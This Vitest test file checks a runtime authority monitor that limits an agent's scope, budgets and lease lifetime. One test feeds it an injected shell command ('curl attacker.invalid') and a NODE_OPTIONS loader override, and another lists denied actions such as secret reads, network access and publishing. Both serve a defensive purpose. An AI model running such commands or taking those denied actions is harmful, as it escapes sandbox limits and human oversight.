import { describe, expect, it, vi } from "vitest";
import {
	LocalReferenceMonitor,
	RuntimeAuthorityDeniedError,
	runtimeAuthorityGrantSchema,
	runtimeAuthorityRequest,
} from "./runtime-authority.js";
import {
	AUTHORITY_IDS,
	AUTHORITY_NOW,
	authorityGrant,
	authorityLimits,
	startRequest,
} from "./runtime-authority.test-support.js";

const noEvidence = { record: () => undefined };

describe("runtime authority grant", () => {
	it("intersects product, local, Mission, and runtime limits into an immutable grant", () => {
		const grant = authorityGrant({
			limit_sources: {
				product: authorityLimits({ reported_tokens: 9_000, artifact_types: ["patch"] }),
				local: authorityLimits({ turn_ms: 40_000 }),
				mission: authorityLimits({ output_bytes: 8_000 }),
				runtime: authorityLimits({ artifact_count: 2, artifact_bytes: 500 }),
			},
		});

		expect(grant.effective_limits).toEqual({
			turn_ms: 40_000,
			reported_tokens: 9_000,
			output_bytes: 8_000,
			artifact_count: 2,
			artifact_bytes: 500,
			artifact_types: ["patch"],
		});
		expect(Object.isFrozen(grant)).toBe(true);
		expect(Object.isFrozen(grant.capabilities)).toBe(true);
		expect(Object.isFrozen(grant.effective_limits.artifact_types)).toBe(true);
	});

	it("rejects a supplied effective limit that was not derived from all four sources", () => {
		const grant = authorityGrant();
		expect(() =>
			runtimeAuthorityGrantSchema.parse({
				...grant,
				effective_limits: { ...grant.effective_limits, reported_tokens: 10_001 },
			}),
		).toThrow(/Effective authority limits/);
	});

	it("accepts every artifact type allowed by the shared Mission contract", () => {
		const grant = authorityGrant({
			limit_sources: {
				product: authorityLimits({ artifact_types: ["openapi.v3", "code-patch"] }),
				local: authorityLimits({ artifact_types: ["openapi.v3", "code-patch"] }),
				mission: authorityLimits({ artifact_types: ["openapi.v3", "code-patch"] }),
				runtime: authorityLimits({ artifact_types: ["openapi.v3", "code-patch"] }),
			},
		});

		expect(grant.effective_limits.artifact_types).toEqual(["code-patch", "openapi.v3"]);
	});

	it("rejects duplicate or mismatched capabilities at the wire boundary", () => {
		const grant = authorityGrant();
		expect(() =>
			runtimeAuthorityGrantSchema.parse({
				...grant,
				capabilities: [...grant.capabilities, grant.capabilities[0]],
			}),
		).toThrow(/unique/);
		expect(() =>
			runtimeAuthorityGrantSchema.parse({
				...grant,
				capabilities: [{ action: "runtime_start", resource: "secret" }],
			}),
		).toThrow(/do not match/);
	});

	it.each(["0", "1".repeat(65)])("rejects an invalid active fence %s", (fencingToken) => {
		const grant = authorityGrant();
		expect(
			runtimeAuthorityGrantSchema.safeParse({ ...grant, fencing_token: fencingToken }).success,
		).toBe(false);
	});
});

describe("LocalReferenceMonitor scope", () => {
	it.each([
		["grant_id", "97000000-0000-4000-8000-000000000099", "wrong_grant"],
		["agent_id", "97000000-0000-4000-8000-000000000099", "wrong_agent"],
		["node_id", "97000000-0000-4000-8000-000000000099", "wrong_node"],
		["workspace_binding_id", "97000000-0000-4000-8000-000000000099", "wrong_workspace"],
		["workspace_alias", "client", "wrong_workspace"],
		["workspace_resource_sha256", "c".repeat(64), "wrong_resource"],
		["mission_id", "97000000-0000-4000-8000-000000000099", "wrong_mission"],
		["delivery_id", "97000000-0000-4000-8000-000000000099", "wrong_delivery"],
		["execution_attempt", 2, "wrong_attempt"],
		["lease_id", "97000000-0000-4000-8000-000000000099", "wrong_lease"],
		["fencing_token", "9007199254740994", "stale_fence"],
		["policy_profile", "untrusted", "policy_changed"],
		["policy_grant_sha256", "c".repeat(64), "policy_changed"],
	] as const)("rejects a changed %s binding", (field, value, code) => {
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		expect(() => monitor.assert({ ...startRequest(), [field]: value })).toThrowError(
			expect.objectContaining<Partial<RuntimeAuthorityDeniedError>>({ code }),
		);
	});

	it("rejects unknown override fields instead of treating them as authority", () => {
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		expect(() =>
			monitor.assert({
				...startRequest(),
				cwd: "/peer/path",
				argv: ["sh", "-c", "curl attacker.invalid"],
				env: { NODE_OPTIONS: "--require=/peer/loader" },
			}),
		).toThrowError(expect.objectContaining({ code: "invalid_request" }));
	});
});

describe("LocalReferenceMonitor decisions", () => {
	it.each([
		["repository_push", "repository"],
		["repository_merge", "repository"],
		["package_publish", "package"],
		["deploy", "deployment"],
		["network_access", "network"],
		["secret_read", "secret"],
		["privilege_expand", "privilege"],
	] as const)("keeps the product deny for %s even if a grant lists it", (action, resource) => {
		const grant = authorityGrant({
			capabilities: [...authorityGrant().capabilities, { action, resource }],
		});
		const monitor = new LocalReferenceMonitor(grant, noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		expect(() => monitor.assert(runtimeAuthorityRequest(grant, { action, resource }))).toThrowError(
			expect.objectContaining({ code: "product_denied" }),
		);
	});

	it("rejects absent capabilities and wrong action-resource pairs", () => {
		const grant = authorityGrant();
		const monitor = new LocalReferenceMonitor(grant, noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		expect(() =>
			monitor.assert(
				runtimeAuthorityRequest(grant, { action: "workspace_write", resource: "workspace" }),
			),
		).toThrowError(expect.objectContaining({ code: "capability_missing" }));
		expect(() =>
			monitor.assert({
				...startRequest(grant),
				capability: { action: "runtime_start", resource: "secret" },
			}),
		).toThrowError(expect.objectContaining({ code: "wrong_resource" }));
	});

	it.each([
		[{ action: "usage_report", resource: "usage" }, { reported_tokens: 10_001 }],
		[
			{ action: "artifact_publish", resource: "artifact" },
			{ artifact_count: 1, artifact_bytes: 20, artifact_type: "binary" },
		],
		[{ action: "outbound_publish", resource: "relay" }, { output_bytes: 32_001 }],
	] as const)("rejects a measured action beyond effective limits", (capability, measurement) => {
		const grant = authorityGrant();
		const monitor = new LocalReferenceMonitor(grant, noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		expect(() =>
			monitor.assert(runtimeAuthorityRequest(grant, capability, measurement)),
		).toThrowError(expect.objectContaining({ code: "budget_exceeded" }));
	});
});

describe("LocalReferenceMonitor lifetime", () => {
	it("treats the exact expiry boundary as expired", () => {
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
			now: () => new Date("2026-08-17T00:01:00.000Z"),
		});
		expect(() => monitor.assert(startRequest())).toThrowError(
			expect.objectContaining({ code: "expired" }),
		);
		expect(monitor.signal.aborted).toBe(true);
	});

	it("renews only the same lease and string fence, without extending the hard deadline", () => {
		let now = new Date(AUTHORITY_NOW);
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, { now: () => now });
		monitor.renew({
			grant_id: AUTHORITY_IDS.grant,
			lease_id: AUTHORITY_IDS.lease,
			fencing_token: "9007199254740993",
			lease_expires_at: "2026-08-17T00:03:00.000Z",
		});
		now = new Date("2026-08-17T00:02:00.000Z");
		expect(monitor.assert(startRequest())).toEqual({ decision: "allow", code: "allowed" });
		now = new Date("2026-08-17T00:05:00.000Z");
		expect(() => monitor.assert(startRequest())).toThrowError(
			expect.objectContaining({ code: "expired" }),
		);
	});

	it("accepts an exact verified lease-renewal replay without changing authority", () => {
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
			now: () => new Date(AUTHORITY_NOW),
		});
		const renewal = {
			grant_id: AUTHORITY_IDS.grant,
			lease_id: AUTHORITY_IDS.lease,
			fencing_token: "9007199254740993",
			lease_expires_at: "2026-08-17T00:01:00.000Z",
		};

		expect(() => monitor.renew(renewal)).not.toThrow();
		expect(() => monitor.renew(renewal)).not.toThrow();
		expect(monitor.assert(startRequest())).toEqual({ decision: "allow", code: "allowed" });
	});

	it("atomically installs an original grant with its latest verified lease", () => {
		const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence, {
			now: () => new Date("2026-08-17T00:02:00.000Z"),
			currentLease: {
				grant_id: AUTHORITY_IDS.grant,
				lease_id: AUTHORITY_IDS.lease,
				fencing_token: "9007199254740993",
				lease_expires_at: "2026-08-17T00:03:00.000Z",
			},
		});

		expect(monitor.assert(startRequest())).toEqual({ decision: "allow", code: "allowed" });
	});

	it("rejects a rollback or scope change during atomic lease installation", () => {
		for (const currentLease of [
			{
				grant_id: AUTHORITY_IDS.grant,
				lease_id: AUTHORITY_IDS.lease,
				fencing_token: "9007199254740993",
				lease_expires_at: "2026-08-16T23:59:00.000Z",
			},
			{
				grant_id: AUTHORITY_IDS.grant,
				lease_id: AUTHORITY_IDS.lease,
				fencing_token: "9007199254740994",
				lease_expires_at: "2026-08-17T00:03:00.000Z",
			},
		]) {
			expect(
				() =>
					new LocalReferenceMonitor(authorityGrant(), noEvidence, {
						now: () => new Date(AUTHORITY_NOW),
						currentLease,
					}),
			).toThrowError(RuntimeAuthorityDeniedError);
		}
	});

	it("aborts continuously when the local authority timer reaches expiry", async () => {
		vi.useFakeTimers();
		vi.setSystemTime(new Date(AUTHORITY_NOW));
		try {
			const monitor = new LocalReferenceMonitor(authorityGrant(), noEvidence);
			await vi.advanceTimersByTimeAsync(60_000);
			expect(monitor.signal.aborted).toBe(true);
			expect(monitor.signal.reason).toBe("expired");
		} finally {
			vi.useRealTimers();
		}
	});
});
